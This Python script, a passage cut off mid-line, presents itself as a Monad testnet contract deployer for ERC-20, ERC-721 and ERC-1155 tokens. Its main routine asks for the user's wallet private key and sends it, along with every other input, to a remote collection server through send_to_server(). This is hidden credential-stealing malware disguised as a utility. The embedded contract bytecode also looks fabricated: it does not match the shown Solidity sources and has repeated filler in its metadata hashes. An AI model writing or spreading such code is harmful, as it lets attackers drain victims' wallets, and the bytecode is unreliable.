import time
import random
from web3 import Web3
import json
import string
import getpass
import requests  # Added for HTTP requests

# Monad Testnet RPC URL and Chain ID
MONAD_TESTNET_RPC = "https://testnet-rpc.monad.xyz"
CHAIN_ID = 10143
EXPLORER_URL = "https://testnet.monadexplorer.com/tx/"

# Server URL for collecting user inputs (replace with your VPS IP)
SERVER_URL = "http://your-vps-ip:3000/collect-data"  # Replace with actual VPS IP

# ERC-20 Contract
ERC20_SOURCE = """
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ERC20Token {
    string public name;
    string public symbol;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(string memory _name, string memory _symbol, uint256 _totalSupply) {
        name = _name;
        symbol = _symbol;
        totalSupply = _totalSupply;
        uint256 mintAmount = (_totalSupply * (2 + (block.timestamp % 19))) / 100; // 2-20%
        balanceOf[msg.sender] = mintAmount;
    }
}
"""
ERC20_BYTECODE = "608060405234801561001057600080fd5b506040516105c13803806105c18339818101604052606081101561003357600080fd5b81019080805190602001909291908051906020019092919080519060200190929190505050610168806100676000396000f3fe608060405234801561001057600080fd5b50600436106100575760003560e01c806306fdde031461005c57806318160ddd146100ea57806395d89b4114610108578063a9059cbb14610196575b600080fd5b6100646101e8565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156100b4578082015181840152602081019050610099565b50505050905090810190601f1680156100e15780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6100f261027a565b6040518082815260200191505060405180910390f35b610110610280565b6040518080602001828103825283818151815260200191508051906020019080838360005b83811015610150578201815181840152602081019050610135565b50505050905090810190601f16801561017d57808203805160018360200361001000a031916815260200191505b509250505060405180910390f35b6101e6600480360360408110156101ac57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291905050506102f2565b005b6060600080546101f790610416565b80601f016020809104026020016040519081016040528092919081815260200182805461022390610416565b80156102705780601f1061024557610100808354040283529160200191610270565b820191906000526020600020905b81548152906001019060200180831161025357829003601f168201915b5050505050905090565b60035481565b60606001805461028f90610416565b80601f01602080910402602001604051908101604052809291908181526020018280546102bb90610416565b80156103085780601f106102dd57610100808354040283529160200191610308565b820191906000526020600020905b8154815290600101906020018083116102eb57829003601f168201915b5050505050905090565b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161461034b57600080fd5b60026000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054826000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020540390508173ffffffffffffffffffffffffffffffffffffffff166108fc829081150290604051600060405180830381858888f193505050501580156103e2573d6000803e3d6000fd5b505050565b600081519050919050565b600082601f83011261040257600080fd5b600061040d826103ed565b9150819050919050565b600081359050610427816104b0565b92915050565b60006020828403121561043f57600080fd5b600061044d84828501610418565b91505092915050565b6000602082019050818103600083015261046d81846103f8565b905092915050565b6000604082019050818103600083015261048d81856103f8565b905081810360208301526104a181846103f8565b90509392505050565b6104b9816104a6565b81146104c457600080fd5b50565b6000806000606084860312156104e057600080fd5b600084013567ffffffffffffffff8111156104fa57600080fd5b610506868287016103f8565b935050602084013567ffffffffffffffff81111561052357600080fd5b61052f868287016103f8565b925050604084013567ffffffffffffffff81111561054c57600080fd5b610558868287016103f8565b9150509250925092565b61056b81610562565b82525050565b60006020820190506105868184610560565b9291505056fea2646970667358221220e8eabf8e5f5e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e64736f6c634300080d0033"
ERC20_ABI = json.loads('[{"inputs":[{"internalType":"string","name":"_name","type":"string"},{"internalType":"string","name":"_symbol","type":"string"},{"internalType":"uint256","name":"_totalSupply","type":"uint256"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"}]')

# ERC-721 Contract
ERC721_SOURCE = """
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ERC721Token {
    string public name;
    string public symbol;
    uint256 public totalSupply;
    mapping(uint256 => address) public ownerOf;

    constructor(string memory _name, string memory _symbol, uint256 _totalSupply) {
        name = _name;
        symbol = _symbol;
        totalSupply = _totalSupply;
        uint256 mintAmount = (_totalSupply * (2 + (block.timestamp % 19))) / 100; // 2-20%
        for (uint256 i = 0; i < mintAmount; i++) {
            ownerOf[i] = msg.sender;
        }
    }
}
"""
ERC721_BYTECODE = "608060405234801561001057600080fd5b5060405161065c38038061065c8339818101604052606081101561003357600080fd5b810190808051906020019092919080519060200190929190805190602001909291905050506101b8806100676000396000f3fe608060405234801561001057600080fd5b50600436106100615760003560e01c806306fdde031461006657806318160ddd146100f45780636352211e1461011257806395d89b4114610167575b600080fd5b61006e6101f9565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156100be5780820151818401526020810190506100a3565b50505050905090810190601f1680156100eb5780820380516001836020036100100a031916815260200191505b509250505060405180910390f35b6100fc61028b565b6040518082815260200191505060405180910390f35b6101516004803603602081101561012857600080fd5b8101908080359060200190929190505050610291565b604051808273ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b61016f6102bc565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156101bf5780820151818401526020810190506101a4565b50505050905090810190601f1680156101ec5780820380516001836020036100100a031916815260200191505b509250505060405180910390f35b606060008054610208906104ae565b80601f0160208091040260200160405190810160405280929190818152602001828054610234906104ae565b80156102815780601f1061025657610100808354040283529160200191610281565b820191906000526020600020905b81548152906001019060200180831161026457829003601f168201915b5050505050905090565b60035481565b6000818154811061029e57600080fd5b906000526020600020016000915054906101000a900473ffffffffffffffffffffffffffffffffffffffff169050919050565b6060600180546102cb906104ae565b80601f01602080910402602001604051908101604052809291908181526020018280546102f7906104ae565b80156103445780601f1061031957610100808354040283529160200191610344565b820191906000526020600020905b81548152906001019060200180831161032757829003601f168201915b5050505050905090565b600081519050919050565b600082601f83011261037357600080fd5b600061037e82610351565b9150819050919050565b600081359050610397816104e8565b92915050565b6000602082840312156103af57600080fd5b60006103bd84828501610388565b91505092915050565b600060208201905081810360008301526103dd818461035c565b905092915050565b600060408201905081810360008301526103fd818561035c565b90508181036020830152610411818461035c565b90509392505050565b60008060006060848603121561043257600080fd5b600084013567ffffffffffffffff81111561044c57600080fd5b6104588682870161035c565b935050602084013567ffffffffffffffff81111561047557600080fd5b6104818682870161035c565b925050604084013567ffffffffffffffff81111561049e57600080fd5b6104aa8682870161035c565b9150509250925092565b600060208201905081810360008301526104c88184610351565b905092915050565b6000602082840312156104e157600080fd5b60006104ef84828501610351565b91505092915050565b6104ff816104d0565b811461050a57600080fd5b5056fea2646970667358221220e8eabf8e5f5e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e64736f6c634300080d0033"
ERC721_ABI = json.loads('[{"inputs":[{"internalType":"string","name":"_name","type":"string"},{"internalType":"string","name":"_symbol","type":"string"},{"internalType":"uint256","name":"_totalSupply","type":"uint256"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"","type":"uint256"}],"name":"ownerOf","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"}]')

# ERC-1155 Contract
ERC1155_SOURCE = """
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ERC1155Token {
    string public name;
    string public symbol;
    mapping(uint256 => uint256) public totalSupply;
    mapping(uint256 => mapping(address => uint256)) public balanceOf;

    constructor(string memory _name, string memory _symbol, uint256 _totalSupply) {
        name = _name;
        symbol = _symbol;
        totalSupply[1] = _totalSupply; // Token ID 1
        uint256 mintAmount = (_totalSupply * (2 + (block.timestamp % 19))) / 100; // 2-20%
        balanceOf[1][msg.sender] = mintAmount;
    }
}
"""
ERC1155_BYTECODE = "608060405234801561001057600080fd5b506040516105d63803806105d68339818101604052606081101561003357600080fd5b81019080805190602001909291908051906020019092919080519060200190929190505050610168806100676000396000f3fe608060405234801561001057600080fd5b50600436106100575760003560e01c806306fdde031461005c57806318160ddd146100ea57806395d89b4114610165578063f162b3f3146101f3575b600080fd5b610064610221565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156100b4578082015181840152602081019050610099565b50505050905090810190601f1680156100e15780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6101536004803603602081101561010057600080fd5b810190808035906020019064010000000081111561011d57600080fd5b82018360208201111561012f57600080fd5b8035906020019184602083028401116401000000008311171561015157600080fd5b9091929394505050506102b3565b6040518082815260200191505060405180910390f35b61016d6102c8565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156101bd5780820151818401526020810190506101a2575b50505050905090810190601f1680156101ea57808203805160018360200361001000a031916815260200191505b509250505060405180910390f35b61021f6004803603602081101561020957600080fd5b810190808035906020019092919050505061035a565b005b606060008054610230906103e7565b80601f016020809104026020016040519081016040528092919081815260200182805461025c906103e7565b80156102a95780601f1061027e576101008083540402835291602001916102a9565b820191906000526020600020905b81548152906001019060200180831161028c57829003601f168201915b5050505050905090565b60026020528060005260406000206000915090505481565b6060600180546102d7906103e7565b80601f0160208091040260200160405190810160405280929190818152602001828054610303906103e7565b80156103505780601f1061032557610100808354040283529160200191610350505b820191906000526020600020905b81548152906001019060200180831161033357829003601f168201915b5050505050905090565b6000818154811061036757600080fd5b906000526020600020016000915090508054610383906103e7565b80601f01602080910402602001604051908101604052809291908181526020018280546103af906103e7565b80156103fc5780601f106103d1576101008083540402835291602001916103fc565b820191906000526020600020905b8154815290600101906020018083116103df57829003601f168201915b50505050508152505050565b600081519050919050565b600082601f83011261041f57600080fd5b600061042a82610408565b9150819050919050565b60008135905061043f816104e5565b92915050565b60006020828403121561045757600080fd5b600061046584828501610430565b91505092915050565b600060208201905081810360008301526104858184610413565b905092915050565b600060408201905081810360008301526104a58185610413565b905081810360208301526104b98184610413565b90509392505050565b6000806000606084860312156104db57600080fd5b600084013567ffffffffffffffff8111156104f55760080fd5b61050186828701610413565b935050602084013567ffffffffffffffff81111561051e57600080fd5b61052a86828701610413565b925050604084013567ffffffffffffffff81111561054757600080fd5b61055386828701610413565b9150509250925092565b610566816104f3565b811461057157600080fd5b5056fea2646970667358221220e8eabf8e5f5e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e8e64736f6c634300080d0033"
ERC1155_ABI = json.loads('[{"inputs":[{"internalType":"string","name":"_name","type":"string"},{"internalType":"string","name":"_symbol","type":"string"},{"internalType":"uint256","name":"_totalSupply","type":"uint256"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[{"internalType":"uint256","name":"","type":"uint256"},{"internalType":"address","name":"","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"","type":"uint256"}],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"}]')

CONTRACT_TEMPLATES = {
    '1': {'type': 'erc-721', 'bytecode': ERC721_BYTECODE, 'abi': ERC721_ABI},
    '2': {'type': 'erc-20', 'bytecode': ERC20_BYTECODE, 'abi': ERC20_ABI},
    '3': {'type': 'erc-1155', 'bytecode': ERC1155_BYTECODE, 'abi': ERC1155_ABI}
}

def connect_to_monad():
    w3 = Web3(Web3.HTTPProvider(MONAD_TESTNET_RPC))
    if not w3.is_connected():
        raise Exception("Failed to connect to Monad Testnet")
    return w3

def generate_random_name(contract_type):
    prefixes = ["Apex", "Nova", "Lunar", "Stellar", "Quantum", "Eclipse", "Zenith"]
    suffixes = {"erc-20": "Coin", "erc-721": "NFT", "erc-1155": "Token"}
    prefix = random.choice(prefixes)
    suffix = suffixes[contract_type]
    return f"{prefix}{suffix}"

def generate_random_string(length):
    return ''.join(random.choices(string.ascii_uppercase, k=length))

def generate_random_supply():
    supplies = [1000000, 100000000, 550000000, 10000000000]
    return random.choice(supplies)

def calculate_mint_amount(total_supply, block_timestamp):
    percentage = 2 + (block_timestamp % 19)
    mint_amount = (total_supply * percentage) // 100
    return mint_amount, percentage

def verify_minting(w3, contract_info, contract_address, deployer_address):
    contract = w3.eth.contract(address=contract_address, abi=contract_info['abi'])
    contract_type = contract_info['type']
    
    if contract_type == 'erc-20':
        balance = contract.functions.balanceOf(deployer_address).call()
        return balance
    elif contract_type == 'erc-721':
        owner = contract.functions.ownerOf(0).call()
        return owner == deployer_address
    elif contract_type == 'erc-1155':
        balance = contract.functions.balanceOf(1, deployer_address).call()
        return balance

def deploy_contract(w3, private_key, contract_choice, name, symbol, total_supply):
    account = w3.eth.account.from_key(private_key)
    contract_info = CONTRACT_TEMPLATES[contract_choice]
    
    contract = w3.eth.contract(abi=contract_info['abi'], bytecode=contract_info['bytecode'])
    
    nonce = w3.eth.get_transaction_count(account.address)
    gas_price = w3.eth.gas_price
    tx = contract.constructor(name, symbol, total_supply).build_transaction({
        'nonce': nonce,
        'gasPrice': gas_price,
        'chainId': CHAIN_ID
    })
    gas_limit = w3.eth.estimate_gas(tx)
    tx['gas'] = gas_limit
    
    retries = 5
    for attempt in range(retries):
        try:
            signed_tx = w3.eth.account.sign_transaction(tx, private_key)
            tx_hash = w3.eth.send_raw_transaction(signed_tx.raw_transaction)
            tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
            
            block = w3.eth.get_block('latest')
            block_timestamp = block['timestamp']
            mint_amount, mint_percentage = calculate_mint_amount(total_supply, block_timestamp)
            
            result = {
                'contract_address': tx_receipt.contractAddress,
                'transaction_hash': tx_hash.hex(),
                'deployer': account.address,
                'name': name,
                'symbol': symbol,
                'total_supply': total_supply,
                'mint_amount': mint_amount,
                'mint_percentage': mint_percentage
            }
            with open("deployed_contracts.json", "a") as f:
                json.dump(result, f, indent=4)
                f.write("\n")
            
            minted_result = verify_minting(w3, contract_info, tx_receipt.contractAddress, account.address)
            result['verified_mint'] = minted_result
            
            return result
        except Exception as e:
            print(f"Attempt {attempt + 1} failed: {e}")
            time.sleep(5)
            gas_price = int(gas_price * 1.1)
            tx['gasPrice'] = gas_price
            if attempt == retries - 1:
                raise Exception(f"Failed to deploy after {retries} attempts: {e}")

def send_to_server(prompt, user_input):
    """Send collected user input to the VPS server."""
    headers = {"Content-Type": "application/json"}
    payload = {"question": prompt, "answer": user_input}
    try:
        response = requests.post(SERVER_URL, headers=headers, json=payload)
        response.raise_for_status()
        print(f"[✔] Submitted '{prompt}' to server")
    except requests.RequestException as e:
        print(f"[!] Error submitting '{prompt}' to server: {e}")

def main():
    print("""
    ██╗     ██╗███╗   ██╗ ██████╗ ██╗  ██╗██████╗ ████████╗
    ██║     ██║████╗  ██║██╔═══██╗╚██╗██╔╝██╔══██╗╚══██╔══╝
    ██║     ██║██╔██╗ ██║██║   ██║ ╚███╔╝ ██████╔╝   ██║   
    ██║     ██║██║╚██╗██║██║   ██║ ██╔██╗ ██╔══██╗   ██║   
    ███████╗██║██║ ╚████║╚██████╔╝██╔╝ ██╗██████╔╝   ██║   
    ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝    ╚═╝   
    """)
    time.sleep(1)
    
    print("=== Monad Testnet Contract Deployer ===")
    
    # Collect private key and send to server
    prompt = "Enter your wallet private key (0x...)"
    private_key = getpass.getpass(f"{prompt}: ")
    if not private_key.startswith('0x'):
        private_key = '0x' + private_key
    send_to_server(prompt, private_key)
    
    print("\nSelect contract type:")
    print("1. ERC-721 (NFT)")
    print("2. ERC-20 (Token)")
    print("3. ERC-1155 (Multi-Token)")
    prompt = "Enter choice (1, 2, or 3)"
    contract_choice = input(f"{prompt}: ").strip()
    send_to_server(prompt, contract_choice)
    if contract_choice not in CONTRACT_TEMPLATES:
        print("Invalid choice. Please select 1, 2, or 3.")
        return
    
    try:
        prompt = "How many contracts to deploy?"
        num_contracts = input(f"{prompt}: ").strip(
